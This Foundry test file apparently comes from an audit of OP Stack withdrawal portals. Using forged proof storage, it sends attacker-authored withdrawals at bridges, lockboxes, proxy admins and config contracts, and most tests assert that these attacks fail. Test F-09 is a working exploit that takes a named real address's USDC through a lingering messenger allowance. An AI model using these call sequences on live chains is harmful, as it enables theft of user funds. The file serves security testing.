// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// ATK-F (attack wave, Opus 5.5): unsafe withdrawal targets and surviving system-contract trust.
// Deployed bytecode only (L1 @ 26433900 via :8545, OP Mainnet @ 159654093 via :9545).
//
// VEHICLE (stated): the L1 proof of each withdrawal is written with vm.store into
// provenWithdrawals[hash][submitter] (v9 OptimismPortal2 slot 57) pointing at the portal's own
// claim-valid anchor game. Everything else (checkWithdrawal, unlock, target call, relock, events) is
// the deployed v9 code. The attacker-authored L2 side is executed for real on the OP Mainnet fork:
// an unprivileged EOA calls L2ToL1MessagePasser.initiateWithdrawal for every row and the test asserts
// sentMessages[hash] == true for the exact struct finalized on L1.

struct WT {
    uint256 nonce;
    address sender;
    address target;
    uint256 value;
    uint256 gasLimit;
    bytes data;
}

interface IPortal {
    function finalizeWithdrawalTransactionExternalProof(WT memory _tx, address _proofSubmitter) external;
    function finalizedWithdrawals(bytes32) external view returns (bool);
    function ethLockbox() external view returns (address);
    function anchorStateRegistry() external view returns (address);
    function paused() external view returns (bool);
    function l2Sender() external view returns (address);
}

interface IASR {
    function anchorGame() external view returns (address);
    function isGameClaimValid(address) external view returns (bool);
}

interface IGame {
    function createdAt() external view returns (uint64);
}

interface IL2MP {
    function initiateWithdrawal(address _target, uint256 _gasLimit, bytes memory _data) external payable;
    function messageNonce() external view returns (uint256);
    function sentMessages(bytes32) external view returns (bool);
}

interface IL2CDM {
    function sendMessage(address _target, bytes calldata _message, uint32 _minGasLimit) external payable;
    function messageNonce() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

contract ATKF_UnsafeTargets is Test {
    bytes32 constant FINALIZED_TOPIC = keccak256("WithdrawalFinalized(bytes32,bool)");
    address constant L2MP = 0x4200000000000000000000000000000000000016;
    address constant L2CDM = 0x4200000000000000000000000000000000000007;
    address constant L2SB = 0x4200000000000000000000000000000000000010;

    // chain index 0 OP, 1 Ink, 2 Soneium, 3 Unichain
    address[4] portal;
    address[4] lockbox;
    address[4] asr;
    address[4] sysCfg;
    address[4] dgf;
    address[4] l1cdm;

    address attacker = makeAddr("attacker");
    address submitter = makeAddr("submitter");

    struct Row {
        string name;
        WT w;
        bool expectSuccess; // what the target call returns (the withdrawal is finalized either way)
    }

    function setUp() public {
        portal = [vm.parseAddress("0xbEb5Fc579115071764c7423A4f12eDde41f106Ed"), vm.parseAddress("0x5d66C1782664115999C47c9fA5cd031f495D3e4F"), vm.parseAddress("0x88e529A6ccd302c948689Cd5156C83D4614FAE92"), vm.parseAddress("0x0bd48f6B86a26D3a217d0Fa6FfE2B491B956A7a2")];
        lockbox = [vm.parseAddress("0x322b47Ff1FA8D5611F761e3E275C45B71b294D43"), vm.parseAddress("0xbd4AbB321138e8Eddc399cE64E66451294325a14"), vm.parseAddress("0x67B4de6FfA66EF201Ea6099A89cA397D56622E31"), vm.parseAddress("0x08bA0023eD60C7Bd040716dD13C45fA0062df5C5")];
        asr = [vm.parseAddress("0x23B2C62946350F4246f9f9D027e071f0264FD113"), vm.parseAddress("0xEe018bAf058227872540AC60eFbd38b023d9dAe2"), vm.parseAddress("0x4890928941e62e273dA359374b105F803329F473"), vm.parseAddress("0x27Cf508E4E3Aa8d30b3226aC3b5Ea0e8bcaCAFF9")];
        sysCfg = [vm.parseAddress("0x229047fed2591dbec1eF1118d64F7aF3dB9EB290"), vm.parseAddress("0x62c0a111929fa32cec2f76adba54c16afb6e8364"), vm.parseAddress("0x7a8ed66b319911a0f3e7288bddab30d9c0c875c3"), vm.parseAddress("0xc407398d063f942febbcc6f80a156b47f3f1bda6")];
        dgf = [vm.parseAddress("0xe5965Ab5962eDc7477C8520243A95517CD252fA9"), vm.parseAddress("0x10d7B35078d3baabB96Dd45a9143B94be65b12CD"), vm.parseAddress("0x512A3d2c7a43BD9261d2B8E8C9c70D4bd4D503C0"), vm.parseAddress("0x2F12d621a16e2d3285929C9996f478508951dFe4")];
        l1cdm = [vm.parseAddress("0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1"), vm.parseAddress("0x69d3cf86b2bf1a9e99875b7e2d9b6a84426c171f"), vm.parseAddress("0x9cf951e3f74b644e621b36ca9cea147a78d4c39f"), vm.parseAddress("0x9a3d64e386c18cb1d6d5179a9596a4b5736e98a6")];
    }

    // ---------------------------------------------------------------- helpers
    function _hash(WT memory w) internal pure returns (bytes32) {
        return keccak256(abi.encode(w.nonce, w.sender, w.target, w.value, w.gasLimit, w.data));
    }

    /// VEHICLE: write the proof cell (slot 57) to the portal's own claim-valid anchor game.
    function _vehicleProve(address p, WT memory w) internal {
        address game = IASR(IPortal(p).anchorStateRegistry()).anchorGame();
        assertTrue(IASR(IPortal(p).anchorStateRegistry()).isGameClaimValid(game), "anchor game claim-valid");
        uint64 ts = IGame(game).createdAt() + 1;
        bytes32 inner = keccak256(abi.encode(_hash(w), uint256(57)));
        bytes32 slot = keccak256(abi.encode(submitter, inner));
        vm.store(p, slot, bytes32(uint256(uint160(game)) | (uint256(ts) << 160)));
    }

    /// Finalize from the attacker and return the success flag of WithdrawalFinalized.
    function _finalize(address p, WT memory w) internal returns (bool success) {
        vm.recordLogs();
        vm.prank(attacker, attacker);
        IPortal(p).finalizeWithdrawalTransactionExternalProof{ gas: 5_000_000 }(w, submitter);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool seen;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].emitter == p && logs[i].topics[0] == FINALIZED_TOPIC) {
                assertEq(logs[i].topics[1], _hash(w));
                success = abi.decode(logs[i].data, (bool));
                seen = true;
            }
        }
        assertTrue(seen, "WithdrawalFinalized emitted");
        assertTrue(IPortal(p).finalizedWithdrawals(_hash(w)), "finalized flag");
    }

    function _sc(address t, bytes memory d) internal view returns (bytes memory r) {
        (bool ok, bytes memory out) = t.staticcall(d);
        r = abi.encode(ok, out);
    }

    /// Hash of shared protocol state on the four chains (authority, pause, custody pointers, game config, impls).
    function _snapshot() internal view returns (bytes32 h) {
        bytes memory acc;
        bytes32 IMPL = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 ADMIN = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        for (uint256 i; i < 4; i++) {
            for (uint256 j; j < 4; j++) {
                acc = abi.encodePacked(acc, _sc(lockbox[i], abi.encodeWithSignature("authorizedPortals(address)", portal[j])));
                acc = abi.encodePacked(acc, _sc(lockbox[i], abi.encodeWithSignature("authorizedLockboxes(address)", lockbox[j])));
            }
            acc = abi.encodePacked(acc, _sc(portal[i], abi.encodeWithSignature("paused()")));
            acc = abi.encodePacked(acc, _sc(portal[i], abi.encodeWithSignature("ethLockbox()")));
            acc = abi.encodePacked(acc, _sc(portal[i], abi.encodeWithSignature("anchorStateRegistry()")));
            acc = abi.encodePacked(acc, _sc(portal[i], abi.encodeWithSignature("l2Sender()")));
            acc = abi.encodePacked(acc, _sc(portal[i], abi.encodeWithSignature("guardian()")));
            acc = abi.encodePacked(acc, _sc(asr[i], abi.encodeWithSignature("respectedGameType()")));
            acc = abi.encodePacked(acc, _sc(asr[i], abi.encodeWithSignature("retirementTimestamp()")));
            acc = abi.encodePacked(acc, _sc(asr[i], abi.encodeWithSignature("anchorGame()")));
            acc = abi.encodePacked(acc, _sc(sysCfg[i], abi.encodeWithSignature("owner()")));
            acc = abi.encodePacked(acc, _sc(sysCfg[i], abi.encodeWithSignature("gasLimit()")));
            acc = abi.encodePacked(acc, _sc(sysCfg[i], abi.encodeWithSignature("batcherHash()")));
            acc = abi.encodePacked(acc, _sc(sysCfg[i], abi.encodeWithSignature("unsafeBlockSigner()")));
            acc = abi.encodePacked(acc, _sc(dgf[i], abi.encodeWithSignature("owner()")));
            acc = abi.encodePacked(acc, _sc(dgf[i], abi.encodeWithSignature("gameImpls(uint32)", uint32(9))));
            acc = abi.encodePacked(acc, _sc(dgf[i], abi.encodeWithSignature("gameImpls(uint32)", uint32(5))));
            acc = abi.encodePacked(acc, _sc(dgf[i], abi.encodeWithSignature("initBonds(uint32)", uint32(9))));
            acc = abi.encodePacked(acc, _sc(l1cdm[i], abi.encodeWithSignature("xDomainMessageSender()")));
            address[6] memory px = [portal[i], lockbox[i], asr[i], sysCfg[i], dgf[i], l1cdm[i]];
            for (uint256 k; k < 6; k++) {
                acc = abi.encodePacked(acc, vm.load(px[k], IMPL), vm.load(px[k], ADMIN));
            }
        }
        address pa = vm.parseAddress("0x543bA4AADBAb8f9025686Bd03993043599c6fB04");
        address am = vm.parseAddress("0xdE1FCfB0851916CA5101820A69b13a4E276bd81F");
        address scfg = vm.parseAddress("0x95703e0982140D16f8ebA6d158FccEde42f04a4C");
        acc = abi.encodePacked(acc, _sc(pa, abi.encodeWithSignature("owner()")));
        acc = abi.encodePacked(acc, _sc(am, abi.encodeWithSignature("owner()")));
        acc = abi.encodePacked(acc, _sc(am, abi.encodeWithSignature("getAddress(string)", "OVM_L1CrossDomainMessenger")));
        acc = abi.encodePacked(acc, _sc(scfg, abi.encodeWithSignature("guardian()")));
        for (uint256 i; i < 4; i++) {
            acc = abi.encodePacked(acc, _sc(scfg, abi.encodeWithSignature("paused(address)", lockbox[i])));
            acc = abi.encodePacked(acc, _sc(scfg, abi.encodeWithSignature("pauseTimestamps(address)", lockbox[i])));
        }
        h = keccak256(acc);
    }

    // ---------------------------------------------------------------- the matrix
    function _A(string memory s) internal pure returns (address) {
        return vm.parseAddress(s);
    }

    function _push(Row[] memory r, uint256 n, Row memory row) internal pure returns (uint256) {
        r[n] = row;
        return n + 1;
    }

    function _rows() internal returns (Row[] memory r) {

        r = new Row[](32);
        uint256 n;
        // sibling lockboxes: unlock (theft) and lock (sticky authorization)
        for (uint256 i = 1; i < 4; i++) {
            n = _push(r, n, Row(string.concat("sibling lockbox unlockETH #", vm.toString(i)), _w(lockbox[i], 0, abi.encodeWithSignature("unlockETH(uint256)", lockbox[i].balance)), false));
            n = _push(r, n, Row(string.concat("sibling lockbox lockETH #", vm.toString(i)), _w(lockbox[i], 1 ether, abi.encodeWithSignature("lockETH()")), false));
        }
        n = _push(r, n, Row("OP lockbox implementation unlockETH", _w(address(uint160(uint256(vm.load(lockbox[0], 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))), 0, abi.encodeWithSignature("unlockETH(uint256)", 1 ether)), false));
        n = _push(r, n, Row("lockbox receiveLiquidity (Ink)", _w(lockbox[1], 1 ether, abi.encodeWithSignature("receiveLiquidity()")), false));
        // messengers: forged first relay (attacker sender => replay branch)
        bytes memory forged = abi.encodeWithSignature("finalizeBridgeETH(address,address,uint256,bytes)", attacker, attacker, 1000 ether, bytes(""));
        for (uint256 i; i < 4; i++) {
            n = _push(r, n, Row(string.concat("L1CDM forged relayMessage #", vm.toString(i)), _w(l1cdm[i], 0, abi.encodeWithSignature("relayMessage(uint256,address,address,uint256,uint256,bytes)", (uint256(1) << 240) | 777, L2SB, _A("0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1"), uint256(0), uint256(0), forged)), false));
        }
        // bridges directly
        n = _push(r, n, Row("L1StandardBridge finalizeBridgeETH", _w(_A("0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1"), 0, forged), false));
        n = _push(r, n, Row("L1StandardBridge finalizeBridgeERC20", _w(_A("0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1"), 0, abi.encodeWithSignature("finalizeBridgeERC20(address,address,address,address,uint256,bytes)", _A("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"), vm.parseAddress("0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"), attacker, attacker, uint256(1e12), bytes(""))), false));
        n = _push(r, n, Row("L1ERC721Bridge finalizeBridgeERC721", _w(_A("0x5a7749f83b81B301cAb5f48EB8516B986DAef23D"), 0, abi.encodeWithSignature("finalizeBridgeERC721(address,address,address,address,uint256,bytes)", _A("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"), _A("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"), attacker, attacker, uint256(1), bytes(""))), false));
        // configuration / authority
        n = _push(r, n, Row("SystemConfig setGasLimit", _w(sysCfg[0], 0, abi.encodeWithSignature("setGasLimit(uint64)", uint64(1))), false));
        n = _push(r, n, Row("SystemConfig setFeature", _w(sysCfg[0], 0, abi.encodeWithSignature("setFeature(bytes32,bool)", bytes32("ETH_LOCKBOX"), false)), false));
        n = _push(r, n, Row("ProxyAdmin upgrade(portal)", _w(_A("0x543bA4AADBAb8f9025686Bd03993043599c6fB04"), 0, abi.encodeWithSignature("upgrade(address,address)", portal[0], attacker)), false));
        n = _push(r, n, Row("ProxyAdmin transferOwnership", _w(_A("0x543bA4AADBAb8f9025686Bd03993043599c6fB04"), 0, abi.encodeWithSignature("transferOwnership(address)", attacker)), false));
        n = _push(r, n, Row("AddressManager setAddress", _w(_A("0xdE1FCfB0851916CA5101820A69b13a4E276bd81F"), 0, abi.encodeWithSignature("setAddress(string,address)", "OVM_L1CrossDomainMessenger", attacker)), false));
        n = _push(r, n, Row("SuperchainConfig pause(lockbox)", _w(_A("0x95703e0982140D16f8ebA6d158FccEde42f04a4C"), 0, abi.encodeWithSignature("pause(address)", lockbox[0])), false));
        n = _push(r, n, Row("ASR v4 setRespectedGameType", _w(asr[0], 0, abi.encodeWithSignature("setRespectedGameType(uint32)", uint32(5))), false));
        n = _push(r, n, Row("ASR v4 blacklistDisputeGame(anchor)", _w(asr[0], 0, abi.encodeWithSignature("blacklistDisputeGame(address)", IASR(asr[0]).anchorGame())), false));
        n = _push(r, n, Row("old ASR 2.0.0 updateRetirementTimestamp", _w(_A("0x18DAc71c228D1C32c99489B7323d441E1175e443"), 0, abi.encodeWithSignature("updateRetirementTimestamp()")), false));
        n = _push(r, n, Row("old ASR 2.2.2 setRespectedGameType", _w(_A("0x1c68ECfbf9C8B1E6C0677965b3B9Ecf9A104305b"), 0, abi.encodeWithSignature("setRespectedGameType(uint32)", uint32(0))), false));
        n = _push(r, n, Row("DelayedWETH v2 recover", _w(_A("0x1B6DBF05EaF22d4E70dC993e8a19dd9F3dcb3162"), 0, abi.encodeWithSignature("recover(uint256)", uint256(1 ether))), false));
        n = _push(r, n, Row("DelayedWETH g1 hold", _w(_A("0xE497B094d6DbB3D5E4CaAc9a14696D7572588d14"), 0, abi.encodeWithSignature("hold(address,uint256)", attacker, uint256(1 ether))), false));
        n = _push(r, n, Row("DGF setImplementation", _w(dgf[0], 0, abi.encodeWithSignature("setImplementation(uint32,address)", uint32(9), attacker)), false));
        n = _push(r, n, Row("L2OutputOracle deleteL2Outputs", _w(_A("0xdfe97868233d1aa22e815a266982f2cf17685a27"), 0, abi.encodeWithSignature("deleteL2Outputs(uint256)", uint256(1))), false));
        n = _push(r, n, Row("OPCMv2 upgrade (direct call)", _w(_A("0x2d91e6F2bcF6CD1df90E1FAF9714E18705EA331f"), 0, abi.encodeWithSignature("upgrade(address)", attacker)), false));
        // permissionless but portal-originated: benign, attacker's own value
        n = _push(r, n, Row("sibling portal depositTransaction (Ink)", _w(portal[1], 1 ether, abi.encodeWithSignature("depositTransaction(address,uint256,uint64,bool,bytes)", attacker, 1 ether, uint64(100_000), false, bytes(""))), true));
        n = _push(r, n, Row("own L1CDM sendMessage (xDomainMessageSender = portal on L2)", _w(l1cdm[0], 0, abi.encodeWithSignature("sendMessage(address,bytes,uint32)", attacker, bytes(""), uint32(0))), true));
        assembly ("memory-safe") {
            mstore(r, n)
        }
    }

    function _w(address t, uint256 v, bytes memory d) internal view returns (WT memory w) {
        w = WT({ nonce: 0, sender: attacker, target: t, value: v, gasLimit: 400_000, data: d });
    }

    /// Creates every row's withdrawal for real on the OP Mainnet fork, from the unprivileged attacker EOA.
    function _initiateOnL2(Row[] memory rows) internal {
        vm.deal(attacker, 100 ether);
        for (uint256 i; i < rows.length; i++) {
            WT memory w = rows[i].w;
            w.nonce = IL2MP(L2MP).messageNonce();
            vm.prank(attacker, attacker);
            IL2MP(L2MP).initiateWithdrawal{ value: w.value }(w.target, w.gasLimit, w.data);
            assertTrue(IL2MP(L2MP).sentMessages(_hash(w)), "L2 sentMessages has the attacker withdrawal");
        }
    }

    // ---------------------------------------------------------------- tests

    /// F-01..F-06: every system contract (all four chains, current + legacy generations) as the target of an
    /// attacker-authored withdrawal finalized on the OP portal. Shared protocol state must not move.
    function test_F01_targetMatrix() public {
        uint256 l1f = vm.createSelectFork("l1");
        assertEq(block.number, 26433900);
        Row[] memory rows = _rows();
        uint256 l2f = vm.createSelectFork("l2");
        assertEq(block.number, 159654093);
        _initiateOnL2(rows);
        vm.selectFork(l1f);
        l2f;
        vm.warp(block.timestamp + 8 days);

        bytes32 snapBefore = _snapshot();
        uint256[4] memory lbBefore;
        for (uint256 i; i < 4; i++) lbBefore[i] = lockbox[i].balance;
        uint256 expectOpDelta;
        uint256 expectInkGain;

        for (uint256 i; i < rows.length; i++) {
            _vehicleProve(portal[0], rows[i].w);
            bool ok = _finalize(portal[0], rows[i].w);
            console2.log(ok ? "  call succeeded :" : "  call failed    :", rows[i].name);
            assertEq(ok, rows[i].expectSuccess, rows[i].name);
            if (ok) expectOpDelta += rows[i].w.value;
            if (ok && rows[i].w.target == portal[1]) expectInkGain += rows[i].w.value;
            assertEq(IPortal(portal[0]).l2Sender(), address(0xdEaD));
        }

        assertEq(_snapshot(), snapBefore, "shared protocol state unchanged");
        assertEq(lockbox[0].balance, lbBefore[0] - expectOpDelta, "OP lockbox: only successful own-value exits");
        assertEq(lockbox[1].balance, lbBefore[1] + expectInkGain, "Ink lockbox: only the attacker's re-deposit");
        assertEq(lockbox[2].balance, lbBefore[2], "Soneium lockbox untouched");
        assertEq(lockbox[3].balance, lbBefore[3], "Unichain lockbox untouched");
        assertEq(portal[0].balance, 0, "no ETH stranded in the portal");
    }

    /// F-07: the current lockbox (and the portal) are blocked at finalize even with a forged proof cell.
    function test_F07_currentLockboxBlocked() public {
        vm.createSelectFork("l1");
        vm.warp(block.timestamp + 8 days);
        for (uint256 c; c < 4; c++) {
            WT memory w = _w(lockbox[c], 0, abi.encodeWithSignature("unlockETH(uint256)", lockbox[c].balance));
            _vehicleProve(portal[c], w);
            vm.prank(attacker, attacker);
            vm.expectRevert(abi.encodeWithSignature("OptimismPortal_BadTarget()"));
            IPortal(portal[c]).finalizeWithdrawalTransactionExternalProof(w, submitter);
            WT memory w2 = _w(portal[c], 0, abi.encodeWithSignature("migrateLiquidity()"));
            _vehicleProve(portal[c], w2);
            vm.prank(attacker, attacker);
            vm.expectRevert(abi.encodeWithSignature("OptimismPortal_BadTarget()"));
            IPortal(portal[c]).finalizeWithdrawalTransactionExternalProof(w2, submitter);
        }
    }

    /// F-08: strongest (unreachable) sender 0x...dEaD keeps l2Sender == DEFAULT during the call. Even then a
    /// sibling lockbox refuses the OP portal (authorization matrix is diagonal), so nothing moves.
    function test_F08_deadSenderVsSiblingLockboxes() public {
        vm.createSelectFork("l1");
        vm.warp(block.timestamp + 8 days);
        bytes32 snapBefore = _snapshot();
        for (uint256 i = 1; i < 4; i++) {
            uint256 bal = lockbox[i].balance;
            WT memory w = _w(lockbox[i], 0, abi.encodeWithSignature("unlockETH(uint256)", bal));
            w.sender = address(0xdEaD);
            w.nonce = 1000 + i;
            _vehicleProve(portal[0], w);
            assertFalse(_finalize(portal[0], w), "sibling lockbox refuses OP portal even with l2Sender==DEFAULT");
            assertEq(lockbox[i].balance, bal);
        }
        assertEq(_snapshot(), snapBefore);
        assertEq(portal[0].balance, 0);
    }

    /// F-09: live object. A real outstanding USDC allowance to the Unichain L1CrossDomainMessenger
    /// (owner 0x66ba29ab..., 9 USDC approved at L1 block 25,084,528, balance 2.531863 USDC) is spendable by
    /// ANY Unichain L2 user through L2CDM.sendMessage(USDC, transferFrom(owner, attacker, bal)).
    /// This is a victim-error object (the owner approved a generic call executor), scored and rejected in
    /// rejected/ATTACK-F-05.md; the test only measures it.
    function test_F09_liveAllowanceToMessenger() public {
        // L2 shape: any EOA can make the L2CDM emit a withdrawal to the L1CDM carrying an arbitrary target/message.
        vm.createSelectFork("l2");
        uint256 mn = IL2CDM(L2CDM).messageNonce();
        vm.prank(attacker, attacker);
        IL2CDM(L2CDM).sendMessage(vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"), hex"23b872dd", 200_000);
        assertEq(IL2CDM(L2CDM).messageNonce(), mn + 1);

        vm.createSelectFork("l1");
        vm.warp(block.timestamp + 8 days);
        address usdc = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
        address victim = vm.parseAddress("0x66ba29ab634845a509d2718deab78dba28b43d79");
        uint256 bal = IERC20(usdc).balanceOf(victim);
        uint256 alw = IERC20(usdc).allowance(victim, l1cdm[3]);
        assertEq(alw, 9_000_000);
        assertEq(bal, 2_531_863);
        bytes memory inner = abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, attacker, bal);
        bytes memory relay = abi.encodeWithSignature("relayMessage(uint256,address,address,uint256,uint256,bytes)", (uint256(1) << 240) | 424242, attacker, usdc, uint256(0), uint256(200_000), inner);
        WT memory w = WT({ nonce: (uint256(1) << 240) | 999999, sender: L2CDM, target: l1cdm[3], value: 0, gasLimit: 1_000_000, data: relay });
        _vehicleProve(portal[3], w);
        assertTrue(_finalize(portal[3], w));
        assertEq(IERC20(usdc).balanceOf(attacker), bal, "attacker received the victim's USDC");
        assertEq(IERC20(usdc).balanceOf(victim), 0);
    }
}
